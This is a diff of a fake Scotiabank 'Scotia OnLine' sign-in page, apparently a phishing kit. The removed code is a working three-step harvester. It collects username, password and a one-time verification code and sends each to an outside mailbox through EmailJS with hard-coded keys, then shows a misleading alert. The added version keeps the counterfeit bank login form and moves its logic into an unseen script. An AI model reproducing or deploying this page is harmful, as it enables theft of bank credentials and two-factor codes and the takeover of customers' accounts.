@@ -1,651 +1,79 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title> Sign in | Scotiabank</title>
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-<style>
-  /* ============ Design tokens ============ */
-  :root {
-    --brand: #d81e2c;
-    --brand-dark: #b01320;
-    --text: #1f2937;
-    --muted: #6b7280;
-    --border: #9ca3af;
-    --error: #dc2626;
-    --surface: #f9fafb;
-    --line: #e5e7eb;
-
-    --space-xs: 6px;
-    --space-sm: 12px;
-    --space-md: 20px;
-    --space-lg: 32px;
-    --space-xl: 48px;
-
-    --radius-sm: 8px;
-    --radius-md: 12px;
-
-    --font-serif: Georgia, "Times New Roman", serif;
-    --font-sans: "Segoe UI", Arial, sans-serif;
-  }
-
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-
-  html { -webkit-text-size-adjust: 100%; }
-
-  body {
-    font-family: var(--font-serif);
-    background: #fff;
-    color: var(--text);
-    min-height: 100vh;
-    min-height: 100dvh;
-    display: flex;
-    flex-direction: column;
-    -webkit-tap-highlight-color: transparent;
-  }
-
-  /* ============ Header ============ */
-  header {
-    padding: var(--space-lg) var(--space-xl) var(--space-md);
-  }
-  .logo {
-    font-family: var(--font-sans);
-    font-size: clamp(24px, 3.5vw, 32px);
-    font-weight: 800;
-    font-style: italic;
-    color: var(--brand);
-    line-height: 1.2;
-  }
-
-  /* ============ Main ============ */
-  main {
-    flex: 1;
-    display: flex;
-    justify-content: center;
-    padding: var(--space-sm) var(--space-md) var(--space-xl);
-    margin-top: var(--space-xl);
-  }
-
-  .panel {
-    width: 100%;
-    max-width: 460px;
-    text-align: center;
-    margin-top: var(--space-lg);
-  }
-  .hidden { display: none; }
-
-  .logo1 {
-    width: 64px;
-    height: 64px;
-    border-radius: 50%;
-    /* background: linear-gradient(135deg, #0ea5e9, #facc15 55%, #111 56%); */
-    margin: var(--space-sm) auto var(--space-md);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-
-  }
-
-  .panel h1 {
-    font-size: clamp(22px, 4vw, 28px);
-    font-weight: 700;
-    line-height: 1.25;
-    margin-bottom: var(--space-lg);
-  }
-
-  /* ============ Fields ============ */
-  .field {
-    text-align: left;
-    margin-bottom: var(--space-lg);
-  }
-  #fullName{ margin-top: var(--space-lg); }
-  .input-wrap { position: relative; }
-  .input-wrap svg {
-    position: absolute;
-    left: 4px;
-    top: 65%;
-    transform: translateY(-50%);
-    width: 24px;
-    height: 24px;
-    stroke: var(--muted);
-    fill: none;
-    stroke-width: 1.5;
-    pointer-events: none;
-  }
-  input[type="text"],  input[type="password"] {
-    width: 100%;
-    padding: var(--space-sm) var(--space-sm) var(--space-sm) 38px;
-    font-size: 18px; /* >=16px prevents iOS zoom-on-focus */
-    font-family: inherit;
-    color: var(--text);
-    border: none;
-    border-bottom: 2px solid var(--border);
-    background: transparent;
-    outline: none;
-    border-radius: 0;
-    transition: border-color .15s;
-  }
-  input::placeholder { color: #9ca3af; }
-  input:focus { border-bottom-color: var(--brand); }
-  .field.invalid input { border-bottom-color: var(--error); }
-  .error {
-    color: var(--error);
-    font-size: 13px;
-    font-family: var(--font-sans);
-    margin-top: var(--space-sm);
-    display: none;
-  }
-  .field.invalid .error { display: block; }
-
-  .form-error {
-    color: var(--error);
-    font-size: 14px;
-    font-family: var(--font-sans);
-    margin-top: var(--space-sm);
-    display: none;
-  }
-  .form-error.show { display: block; }
-
-  .forgot-link {
-      width: 100vw;
-    margin: 14px 0 0;
-    font-family: "Segoe UI", Arial, sans-serif;
-    font-size: 16px;
-    font-weight: 700;
-    color: #0e7490;          /* teal from your screenshot */
-    text-align: left !important; 
-    /* align-self: flex-start !important; */
-    margin: 0 0 13% 0;
-    cursor: pointer;
-  }
-  .forgot-link:hover {
-    color: #155e75;          /* darker teal on hover */
-  }
-
-  #step2, #greeting{
-    margin-top: var(--space-xl);
-  } 
-
-  /* Muted prompt line */
-.new-user-prompt {
-  margin: 32px 0 0;
-  font-family: "Segoe UI", Arial, sans-serif;
-  font-size: 17px;
-  color: #6b7280;          /* muted gray */
-  text-align: left !important;
-}
-
-/* Teal action link */
-.enroll-link {
-  width: 100%;
-  display: inline-block;
-  margin: 6px 0 10%;
-  font-family: "Segoe UI", Arial, sans-serif;
-  font-size: 15px;
-  font-weight: 700;
-  color: #0e7490;          /* same teal as the forgot link */
-  text-decoration: none;
-  text-align: left !important;
-  
-  cursor: pointer;
-}
-.enroll-link:hover {
-  color: #155e75;          /* darker teal */
-  text-decoration: underline;
-}
-  /* ============ Checkbox rows ============ */
-  .check-row {
-    display: flex;
-    align-items: flex-start;
-    gap: 10px;
-    margin: var(--space-xl) 0 var(--space-lg);
-    text-align: left;
-    cursor: pointer;
-    user-select: none;
-    font-family: var(--font-sans);
-    font-size: 15px;
-    line-height: 1.4;
-    color: var(--text);
-
-  }
-  .check-row input[type="checkbox"] {
-    width: 20px;
-    height: 20px;
-    margin-top: 1px;
-    accent-color: var(--brand);
-    cursor: pointer;
-    flex-shrink: 0;
-  }
-  .check-row.invalid { color: var(--error); }
-  .check-error {
-    color: var(--error);
-    font-size: 13px;
-    font-family: var(--font-sans);
-    margin-top: var(--space-xs);
-    display: none;
-    text-align: left;
-  }
-  .check-error.show { display: block; }
-
-  /* ============ Buttons ============ */
-  button.submit {
-    width: 100%;
-    padding: 18px var(--space-md);
-    margin-top: var(--space-md);
-    min-height: 56px; /* comfortable touch target */
-    font-size: 18px;
-    font-weight: 600;
-    font-family: var(--font-sans);
-    color: #fff;
-    background: var(--brand);
-    border: none;
-    border-radius: var(--radius-md);
-    cursor: pointer;
-    transition: background .15s;
-  }
-  button.submit:hover { background: var(--brand-dark); }
-  button.submit:focus-visible {
-    outline: 3px solid rgba(216, 30, 44, .35);
-    outline-offset: 2px;
-  }
-  button.submit:disabled { opacity: .6; cursor: not-allowed; }
-
-  .back-link {
-    display: inline-block;
-    margin-top: var(--space-md);
-    padding: var(--space-xs) var(--space-sm);
-    font-family: var(--font-sans);
-    font-size: 14px;
-    color: var(--brand);
-    background: none;
-    border: none;
-    cursor: pointer;
-    font-weight: 600;
-  }
-  .back-link:hover { text-decoration: underline; }
-  .back-link:focus-visible {
-    outline: 2px solid var(--brand);
-    outline-offset: 1px;
-    border-radius: 4px;
-  }
-
-  /* ============ Page 3 ============ */
-  .page3{ margin-top: var(--space-xl); }
-  .page3 h1 { margin-bottom: var(--space-xl);  margin-top: var(--space-xl);}
-
-  .img-section {
-    width: 100%;
-    height: clamp(150px, 30vw, 220px);
-    border-radius: var(--radius-md);
-    overflow: hidden;
-    background: none;
-    /* border: 1px solid var(--line); */
-    margin-bottom: var(--space-xl);
-    margin-top: var(--space-xl);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-  .img-section img {
-    width: 100%;
-    height: 100%;
-    object-fit:contain;
-    display: block;
-  }
-  .img-caption {
-    font-family: var(--font-sans);
-    font-size: 30px;
-    line-height: 1.5;
-    /* color: var(--muted); */
-    margin-bottom: var(--space-xs);
-  }
-  .helper-text {
-    font-family: var(--font-sans);
-    font-size: 25px;
-    line-height: 1.5;
-    /* color: var(--muted); */
-    /* text-align: left; */
-    margin-bottom: var(--space-xs);
-  }
-  #extraField{margin-top: var(--space-xl);}
-  .code-field { max-width: 220px; margin-left: auto; margin-right: auto; }
-  .code-field .input-wrap svg { display: none; }
-  input.code-input {
-    width: 200px;
-    max-width: 100%;
-    padding-left: 12px;
-    text-align: center;
-    font-size: 20px;
-    letter-spacing: 0.45em;
-  }
-  .code-input::placeholder {
-    color: #d1b8ba;;
-    font-size: 15px;
-    letter-spacing: 2px;
-  }
- 
-  .below-text {
-    margin: var(--space-xs) 0 var(--space-md);
-    font-size: 20px;
-  }
-
-  /* ============ Footer ============ */
-  footer {
-    border-top: 1px solid var(--line);
-    padding: var(--space-lg) var(--space-xl);
-  }
-  .footer-links {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-    justify-items: center;
-    gap: var(--space-sm) var(--space-lg);
-    max-width: 700px;
-    margin: 0 auto var(--space-lg);
-    font-family: var(--font-sans);
-    font-size: 15px;
-  }
-  .footer-links a {
-    color: var(--text);
-    text-decoration: none;
-    padding: 4px 0;
-  }
-  .footer-links a:hover { color: var(--brand); }
-  .copyright {
-    text-align: center;
-    color: var(--muted);
-    font-size: 13px;
-    line-height: 1.5;
-    font-family: var(--font-sans);
-  }
-
-  /* ============ Mobile: compact, centered, professional ============ */
-  @media (max-width: 640px) {
-    header {
-      padding: var(--space-md) var(--space-md) var(--space-sm);
-    }
-
-    main {
-      padding: var(--space-xs) var(--space-md) var(--space-xs);
-      margin-top: var(--space-xs);
-    }
-    .panel { max-width: 100%; }
-
-    /* .avatar {
-      width: 56px;
-      height: 56px;
-      margin: var(--space-sm) auto var(--space-md);
-    }
-     */
-    .panel h1 {
-      margin-bottom: var(--space-sm);
-    }
-
-    .field { margin-bottom: var(--space-md); }
-    .check-row { margin-top: var(--space-sm); }
-
-    button.submit {
-      margin-top: var(--space-md);
-      padding: 16px var(--space-md);
-    }
-
-    .img-caption { font-size: 20px; }
-    .helper-text{font-size: 17px;}
-    .below-text{font-size: 15px;}
-
-    #lock{margin-top:-5%}
-
-    #address{margin-top: var(--space-lg); margin-bottom: var(--space-lg);}
-
-    /* Footer as a tight, centered grid */
-    footer {
-      padding: var(--space-md) var(--space-md) var(--space-lg);
-    }
-    .footer-links {
-      grid-template-columns: repeat(2, 1fr);
-      max-width: 320px;
-      gap: 12px var(--space-sm);
-      margin-bottom: var(--space-md);
-      font-size: 14px;
-      text-align: center;
-    }
-    .copyright {
-      font-size: 12px;
-      max-width: 280px;
-      margin: 0 auto;
-    }
-  }
-</style>
-<base target="_blank">
-<base target="_blank">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in | Scotiabank</title>
+  <link rel="stylesheet" href="./output.css">
+  <script src="./bundled.js"  defer></script>
 </head>
-<body>
+<body class="relative bg-[#FFFFFF] overflow-x-hidden">
+  <nav class="justify-center px-[24px] py-[24px] w-[100%]" >
+    <a href="#">
+      <img src="logo-mobile.svg" alt="">
+    </a>
+  </nav>
 
-<header>
-  <div class="logo"><img src="./logo-mobile.svg" alt=""></div>
-</header>
-
-<main>
-
-  <!-- PAGE 1: Full name + "this is me" checkbox -->
-  <form class="panel" id="step1" novalidate>
-    <div class="logo1" ><img src="./logo-mobile.svg" alt="" style="margin: 10 0 30 0;"></div>
-    <h1>Welcome to Scotia OnLine</h1>
-
-    <div class="field" id="nameField">
-      <div class="input-wrap">
-        <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 4-6 8-6s8 2 8 6"/></svg>
-        <input type="text" id="fullName" placeholder="Username" autocomplete="name">
+  <main>
+    <div class="flex justify-center pt-[36px]">
+      <img class="" src="c93fc59ddab28275bff50e097f646dc6.png.png.png" alt="">
+    </div>
+    <h1 class="py-9 font-bold text-[#333333] text-[23.25px] text-center" style="letter-spacing: -0.25;">
+      Welcome to Scotia OnLine
+    </h1>
+    <form id="form" class="mx-auto max-w-[318px]">
+      <div class="flex justify-center items-center gap-[15px] mb-3 w-[100%] input" >
+        <img src="user.svg" alt="">
+        <input type="text" name="input_one" required id="username" class="w-[100%] h-[48px]" placeholder="Card number or username">
       </div>
-      <p class="error">Please enter your username.</p>
-    </div>
-
-    <p class="forgot-link">Forgot your username?</p>
-
-    <label class="check-row" id="meRow">
-      <input type="checkbox" id="thisIsMe">
-      <span>Remember my username </span>
-    </label>
-       
-
-    <button type="submit" class="submit">Continue</button>
-
-    <p class="new-user-prompt">New to Scotia OnLine?</p>
-    <a href="#" class="enroll-link">Enroll now</a>
-  </form>
-
-  <!-- PAGE 2: Address -->
-  <form class="panel hidden" id="step2" novalidate>
-    <h1 id="greeting">Your Password</h1>
-
-    <div class="field" id="addrField">
-      <div class="input-wrap">
-      <svg id="lock" viewBox="0 0 24 24">
-        <rect x="4.5" y="10.5" width="15" height="10" rx="2"/>
-        <path d="M8 10.5V7a4 4 0 1 1 8 0v3.5"/>
-        <circle cx="12" cy="15.5" r="1.2"/>
-      </svg>
-  <input type="password" id="address" placeholder="Password" >
+      
+      <div class="flex justify-center items-center gap-[15px] w-[100%] input" >
+        <img src="lock.svg" alt="">
+        <input type="password" name="input_two" required id="password" class="w-[100%] h-[48px]" placeholder="Password">
       </div>
-      <p class="error">Please enter your password.</p>
+      <p class="pt-6 pb-[50px] font-bold text-[#007EAB] text-[15.13px]">
+        Forgot your username or password
+      </p>
+      <div class="flex flex-row-reverse gap-3">
+        <label for="checkbox"> Remember my username or password?
+        </label>
+        <input type="checkbox" name="checkbox" id="toggle">
+      </div>
+      <button class="bg-[#EC111A] mt-[47px] mb-[26px] py-[17px] rounded-lg w-[100%] text-white" type="submit">
+        Sign in
+      </button>
+      <div class="pb-[34px]">
+        <p class="pb-[2px] font-light text-[#757575]">New to Scotia OnLine?</p>
+        <a href="" class="text-[#007EAB] text-[15.5px] text-bold" >Enroll now</a>
+  
+      </div>
+    </form>
+    <div class="bg-[#E2E8EE] w-[100%] h-[1px]"></div>
+  </main>
+
+  <footer class="flex gap-[51px] pt-[59px] pb-[102px] pl-[9px] text-[#333333] text-sm" >
+    <div class="flex flex-col gap-6">
+      <p>Legal</p>
+      <p>Privacy</p>
+      <p>Security</p>
+      <p>FATCA</p>
     </div>
-
-    <p class="form-error" id="step2Error">Something went wrong sending your details. Please try again.</p>
-    <button type="submit" class="submit" id="submitBtn">Submit</button>
-    <button type="button" class="back-link" id="backBtn">&larr; Back</button>
-  </form>
-
-  <!-- PAGE 3: Header, image, caption, helper text, input, checkbox -->
-  <form class="panel page3 hidden" id="step3" novalidate>
-    <!-- <h1>Almost done</h1> -->
-
-    <!-- Image section: replace the src with your own image -->
-    <div class="img-section">
-      <img src="shield.svg" alt="Welcome image" onerror="this.style.display='block'">
+    <div class="flex flex-col gap-6">
+      <p>Security Guarantee</p>
+      <p>Terms and Conditions</p>
+      <p>Acessibility</p>
+      <p>Contact Us</p>
     </div>
-    <p class="img-caption">Let's verify your identity</p>
+  </footer>
 
-    <p class="helper-text">To confirm it's you, we sent a 6-digit code to your email</p>
-    <div class="field code-field" id="extraField">
-    <div class="input-wrap">
-      <input type="text" id="extra" class="code-input" placeholder="6-digit code"
-            inputmode="numeric" autocomplete="one-time-code" maxlength="6">
-    </div>
-    <p class="error">Please enter exactly 6 digits.</p>
+  <div class="flex items-center bg-[#F5F6FC] h-[47px]">
+    <p class="pl-[50%] text-[#333333] text-[12px] text-nowrap">
+      &copy; Scotiabank. All Rights Reserved.
+    </p>
   </div>
-    <p class="helper-text below-text">If you don't receive it within one minute, <br>
-you can request a new one.</p>
 
-    <label class="check-row" id="confirmRow">
-      <input type="checkbox" id="confirm">
-      <span>Remember my username on this device and skip verification next time. <br>
-       <b>IMPORTANT: </b>Do not trust public devices.</span>
-    </label>
-
-    <p class="form-error" id="step3Error">Something went wrong sending your detail. Please try again.</p>
-    <button type="submit" class="submit" id="step3Btn">Finish</button>
-  </form>
-
-</main>
-
-<footer>
-  <div class="footer-links">
-    <a href="#">Legal</a>
-    <a href="#">Security Guarantee</a>
-    <a href="#">Privacy</a>
-    <a href="#">Terms &amp; Conditions</a> 
-    <a href="#">Security</a>
-    <a href="#">Accessibility</a>
-    <a href="#">FATCHA</a>
-    <a href="#">Contact Us</a>
+  <div class="bg-[#EC111A] px-[40.66px] py-[8.5px] text-white feedback">
+    Feedback
   </div>
-  <p class="copyright">© Scotiabank. All Rights Reserved..</p>
-</footer>
-
-<script>
-  /* ================= EmailJS config =================
-     Template variables available: {{full_name}}, {{address}}, {{extra}} */
-  const EMAILJS_PUBLIC_KEY  = 'f47k4cMV2n2lS794i';
-  const EMAILJS_SERVICE_ID  = 'service_f8xpz0n';
-  const EMAILJS_TEMPLATE_ID = 'template_t1ri45y';
-
-  emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
-
-  const step1 = document.getElementById('step1');
-  const step2 = document.getElementById('step2');
-  const step3 = document.getElementById('step3');
-  const data = { fullName: '', address: '', extra: '' };
-
-  function showStep(n) {
-    step1.classList.toggle('hidden', n !== 1);
-    step2.classList.toggle('hidden', n !== 2);
-    step3.classList.toggle('hidden', n !== 3);
-    window.scrollTo(0, 0);
-  }
-
-  function escapeHtml(s) {
-    return s.replace(/[&<>"']/g, c => ({
-      '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
-    }[c]));
-  }
-
-  // ---- Page 1: full name + "this is me" checkbox ----
-  step1.addEventListener('submit', (e) => {
-    e.preventDefault();
-    const fullName = document.getElementById('fullName').value.trim();
-    const meChecked = document.getElementById('thisIsMe').checked; // optional
-
-    const badName = fullName.split(/\s+/).filter(Boolean).length > 1 || fullName === "";
-    document.getElementById('nameField').classList.toggle('invalid', badName);
-
-    if (badName) return;
-    // if (badName === '') return 
-
-    data.fullName = fullName;
-    document.getElementById('greeting').textContent =
-    'username: ' +  escapeHtml(fullName.split(/\s+/)[0]);
-    showStep(2);
-  });
-
-  // ---- Back ----
-  document.getElementById('backBtn').addEventListener('click', () => showStep(1));
-
-  // ---- Page 2: validate, send to EmailJS, then go to page 3 ----
-  step2.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const address = document.getElementById('address').value.trim();
-    const bad = address.length < 5;
-    document.getElementById('addrField').classList.toggle('invalid', bad);
-    if (bad) return;
-
-    data.address = address;
-    const btn = document.getElementById('submitBtn');
-    const err = document.getElementById('step2Error');
-    err.classList.remove('show');
-    btn.disabled = true;
-    btn.textContent = 'Please wait…';
-
-    try {
-      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-        full_name: data.fullName,
-        address:   data.address,
-        // this_is_me: meChecked ? 'yes' : 'no'
-      });
-      // Redirect to the third page
-      showStep(3);
-    } catch (sendError) {
-      console.error('EmailJS error:', sendError);
-      err.classList.add('show');
-    } finally {
-      btn.disabled = false;
-      btn.textContent = 'Submit';
-    }
-  });
-
-  // ---- Page 3: input + confirm checkbox, sent to EmailJS ----
-  step3.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const extra = document.getElementById('extra').value.trim();
-    const confirmed = document.getElementById('confirm').checked; // optional
-
-    const badExtra = extra.length < 3;
-    document.getElementById('extraField').classList.toggle('invalid', badExtra);
-    if (badExtra) return;
-
-    const extraInput = document.getElementById('extra');
-      let realCode = '';
-      extraInput.addEventListener('input', () => {
-        const digits = extraInput.value.replace(/\D/g, '').slice(0, 6);
-        realCode = digits;
-        extraInput.value = 'x'.repeat(digits.length);
-      });
-          data.extra = extra;
-    const btn = document.getElementById('step3Btn');
-    const err = document.getElementById('step3Error');
-    err.classList.remove('show');
-    btn.disabled = true;
-    btn.textContent = 'Please wait…';
-
-    try {
-      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-        full_name: data.fullName,
-        address:   data.address,
-        extra:     data.extra,
-        confirmed: confirmed ? 'yes' : 'no'
-      });
-      btn.textContent = 'Done ✓';
-      alert('Processing disbursement queue addition')
-    } catch (sendError) {
-      console.error('EmailJS error:', sendError);
-      err.classList.add('show');
-      btn.disabled = false;
-      btn.textContent = 'Finish';
-    }
-  });
-</script>
-
 </body>
 </html>
-  <!-- const EMAILJS_PUBLIC_KEY  = 'f47k4cMV2n2lS794i';
-  const EMAILJS_SERVICE_ID  = 'service_f8xpz0n';
-  const EMAILJS_TEMPLATE_ID = 'template_t1ri45y'; -->
